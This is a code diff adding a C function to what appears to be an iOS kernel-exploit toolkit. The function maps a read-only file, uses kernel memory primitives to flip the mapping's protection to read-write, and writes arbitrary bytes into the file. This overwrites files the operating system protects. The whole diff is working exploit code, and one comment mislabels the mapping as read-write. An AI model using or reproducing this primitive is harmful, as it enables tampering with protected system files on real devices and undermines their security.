@@ -193,3 +193,48 @@ uint64_t funVnodeOverwrite2(char* to, char* from) {
     // Return success or error code
     return 0;
 }
+
+uint64_t funVnodeOverwriteWithBytes(const char* filename, off_t file_offset, const void* overwrite_data, size_t overwrite_length, bool unmapAtEnd) {
+    printf("overwrite with bytes\n");
+    
+    int file_index = open(filename, O_RDONLY);
+    if (file_index == -1) return -1;
+    off_t file_size = lseek(file_index, 0, SEEK_END);
+    
+    if (file_size < file_offset + overwrite_length) {
+        close(file_index);
+        printf("[-] Offset + length is beyond the file size!\n");
+        return -1;
+    }
+    
+    // mmap as read-write
+    printf("mmap as read only\n");
+    char* file_data = mmap(NULL, file_size, PROT_READ, MAP_SHARED, file_index, 0);
+    if (file_data == MAP_FAILED) {
+        close(file_index);
+        // Handle error mapping the file
+        printf("failed mmap...\n try again");
+        return -1;
+    }
+    
+    printf("task_get_vm_map -> vm ptr\n");
+    uint64_t vm_ptr = task_get_vm_map(getTask());
+    uint64_t entry_ptr = vm_map_find_entry(vm_ptr, (uint64_t)file_data);
+    
+    printf("set prot to rw-\n");
+    vm_map_entry_set_prot(entry_ptr, PROT_READ | PROT_WRITE, PROT_READ | PROT_WRITE);
+    
+    // Write the provided data at the specified offset
+    printf("Writing data at offset %lld\n", file_offset);
+    memcpy(file_data + file_offset, overwrite_data, overwrite_length);
+    
+    // Optionally unmap the memory at the end
+    if (unmapAtEnd) {
+        // Cleanup
+        munmap(file_data, file_size);
+        close(file_index);
+    }
+
+    // Return success or error code
+    return 0;
+}
